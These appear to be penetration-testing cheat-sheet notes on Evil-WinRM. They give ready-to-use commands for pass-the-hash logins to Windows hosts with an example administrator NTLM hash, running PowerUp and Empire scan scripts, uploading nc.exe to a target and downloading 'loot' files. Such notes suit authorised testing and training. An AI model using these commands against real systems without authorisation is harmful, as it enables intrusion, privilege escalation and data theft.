# Evil-WinRM

Evil-WinRM is a powerful post-exploitation tool for interacting with Windows systems over WinRM (Windows Remote Management).

---

## Prerequisites

- Target machine must have **WinRM enabled** (default ports: 5985/5986).
- Valid credentials:
  - Username
  - Password **or** NTLM hash
- Evil-WinRM installed on your system.
- (Optional) A directory with PowerShell scripts for post-exploitation.

---

## Syntax Overview

- **With Password:**

```bash
evil-winrm -i <target_ip> -u <username> -p <password>
```

- **With NTLM Hash:**

```bash
evil-winrm -i <target_ip> -u <username> -H <NTLM_hash>
```

- **With Script Directory:**

```bash
evil-winrm -i <target_ip> -u <username> -H <NTLM_hash> -s /path/to/scripts
````

> **Empire C2 Modules Path (PowerShell Scripts):**  
> `/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/`  
> Example: `Invoke-Portscan.ps1`, `Invoke-Portscan -Hosts 10.200.81.100 -TopPorts 50`

---

### Explanation of Options

| Option | Description                                          |
|--------|------------------------------------------------------|
| `-i`   | IP address of the target Windows machine             |
| `-u`   | Username                                              |
| `-p`   | Plaintext password                                    |
| `-H`   | NTLM hash (no password needed)                        |
| `-s`   | Local path to scripts for use in the session          |

---

### Example Scenario

- Target IP: `10.10.10.123`
- Username: `administrator`
- NTLM Hash: `cc36cf7a8514893efccd332446158b1a`
- Script Directory: `~/winrm-scripts`

Command:

```bash
evil-winrm -i 10.10.10.123 -u administrator -H cc36cf7a8514893efccd332446158b1a -s ~/winrm-scripts
````

---

### Running Scripts Inside the Session

- Load and run interactively:

  ```powershell
  . .\PowerUp.ps1
  Invoke-AllChecks
  ```

- One-time execution:

  ```powershell
  powershell -file PowerUp.ps1
  ```

---

### File Transfer Commands

- **Upload** a file to the target:

  ```bash
  upload <local_file_path> [remote_file_name]
  ```

  Example:

  ```bash
  upload ../../../../../usr/share/windows-binaries/nc.exe nc.exe
  ```

- **Download** a file from the target:

  ```bash
  download <remote_file_path> [local_file_name]
  ```

  Example:

  ```bash
  download C:\Users\Administrator\Desktop\loot.txt
  ```

---

### Additional Notes

- Only the **NTLM** portion of an LM\:NTLM hash pair is needed.
- Make sure port **5985 (HTTP)** or **5986 (HTTPS)** is open.
- Use `--ssl` if connecting over HTTPS.
- Useful local tools are also located at:

  ```bash
  /usr/share/windows-binaries/
  ```
